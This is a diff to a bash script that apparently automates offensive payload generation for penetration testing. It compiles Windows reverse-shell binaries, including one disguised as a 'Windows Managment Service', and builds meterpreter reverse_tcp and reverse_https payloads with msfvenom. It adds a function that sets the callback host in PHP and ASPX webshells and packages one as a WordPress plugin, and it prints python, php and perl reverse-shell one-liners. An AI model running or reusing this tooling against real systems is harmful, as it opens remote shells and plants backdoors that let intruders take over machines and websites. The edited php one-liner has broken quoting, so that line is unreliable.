@@ -9,6 +9,7 @@ usage() {
     echo "-c    -> compile basic binaries"
     echo "-m    -> compile meterpreter binaries"
     echo "-d    -> compile all binaries but don't list"
+    echo "-w    -> set up webshells and don't list"
     echo "-g    -> generate powershell one liners"
     echo "-s    -> don't start python http server"
     echo "-h    -> help menu"
@@ -30,7 +31,7 @@ get_ip_address() {
     fi
 }
 
-set_payloads() {
+compile_payloads() {
     echo "COMPILING"
     echo "=============================================="
     sed -i "s/^#define SERVER_IP.*/#define SERVER_IP \"$lhost\"/; s/^#define SERVER_PORT.*/#define SERVER_PORT $lport/" /home/$USER/auto/payloads/src/cppdll_shell.cpp
@@ -41,14 +42,29 @@ set_payloads() {
 
     x86_64-w64-mingw32-gcc /home/$USER/auto/payloads/src/rs_service/main.c /home/$USER/auto/payloads/src/rs_service/service.c /home/$USER/auto/payloads/src/rs_service/shell.c -o /home/$USER/auto/payloads/rs_service.exe \
     -DSERVER_HOST=L"\"$lhost\"" -DSERVER_PORT=L"\"$lport\"" -DSERVICE_NAME=L"\"WinMansvc\"" -DSERVICE_DESC=L"\"Windows Managment Service\"" -DDISPLAY_NAME=L"\"WinMansvc\"" -DUNICODE -D_UNICODE -DWIN32_LEAN_AND_MEAN -lws2_32
-
-    
 }
 
-make_meterpreter() {
+compile_meterpreter() {
+    echo "Making Meterpreter Payloads"
+    echo "=============================================="
     msfvenom --platform windows --arch x64 --payload windows/x64/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f exe > /home/$USER/auto/payloads/mettcp.exe
     msfvenom --platform windows --arch x64 --payload windows/x64/meterpreter/reverse_https LHOST=$lhost LPORT=$lport -f exe > /home/$USER/auto/payloads/methttps.exe
 }
+
+
+set_webshells() {
+    echo "Changing LHOST and LPORT in WebShells"
+    echo "=============================================="
+    sed -i "s/^\$ip =.*/\$ip = \"$lhost\";/; s/^\$port =.*/\$port = $lport;/" /home/$USER/auto/payloads/phpshell.php
+    zip /home/$USER/auto/payloads/wpshell.zip /home/$USER/auto/payloads/phpshell.php
+    echo ""
+    echo "pentestmonkey reverse shell location -> /home/$USER/auto/payloads/phpshell.php"
+    echo "wordpress plugin zip location -> /home/$USER/auto/payloads/wpshell.php"
+    
+    sed -i "s/^String host =.*/String host = \"$lhost\";/; s/^int port =.*/int port = $lport;/" /home/$USER/auto/payloads/shell.aspx # not working rn for some reason
+    echo "aspx shell location -> /home/$USER/auto/payloads/shell.aspx" 
+}
+
 
 # prints the list
 list_stuff() {
@@ -76,7 +92,7 @@ list_stuff() {
     echo ""
     echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$lhost\",$lport));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
     echo ""
-    echo -n 'php -r $sock';echo "=fsockopen(\"$lhost\",$lport);exec(\"/bin/sh -i <&3 >&3 2>&3\");"
+    echo "php -r \$sock';echo =fsockopen(\"$lhost\",$lport);exec(\"/bin/sh -i <&3 >&3 2>&3\");"
     echo ""
     echo "perl -e 'use Socket;\$i=\"$lhost\";\$p=$lport;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
     echo ""
@@ -157,16 +173,16 @@ start_http_server() {
     fi
 }
 
-
 custom_lhost=false
 compile=false
 meterpreter=false
+webshells=false
 genshells=false
 start_python=true
 compile_and_dontlist=false
 
 # Parse arguments
-while getopts ":cmdgsi:p:" opt; do
+while getopts ":cmdwgsi:p:" opt; do
     case ${opt} in
     c )
         compile=true
@@ -176,6 +192,9 @@ while getopts ":cmdgsi:p:" opt; do
         ;;
     d )
         compile_and_dontlist=true
+        ;;
+    w )
+        webshells=true
         ;;
     g )
         genshells=true
@@ -197,21 +216,28 @@ while getopts ":cmdgsi:p:" opt; do
 done
 shift $((OPTIND -1))
 
+
+
 # Get interface IP if one was not set manually
 if ! $custom_lhost; then
     get_ip_address
 fi
 
 if $compile; then
-    set_payloads
+    compile_payloads
 fi
 
 if $meterpreter; then
-    make_meterpreter
+    compile_meterpreter
+fi
+
+if $webshells; then
+    set_webshells
+    exit 1
 fi
 
 if $compile_and_dontlist; then
-    set_payloads
+    compile_payloads
 else
     list_stuff $genshells
 
@@ -219,3 +245,4 @@ else
         start_http_server
     fi
 fi
+
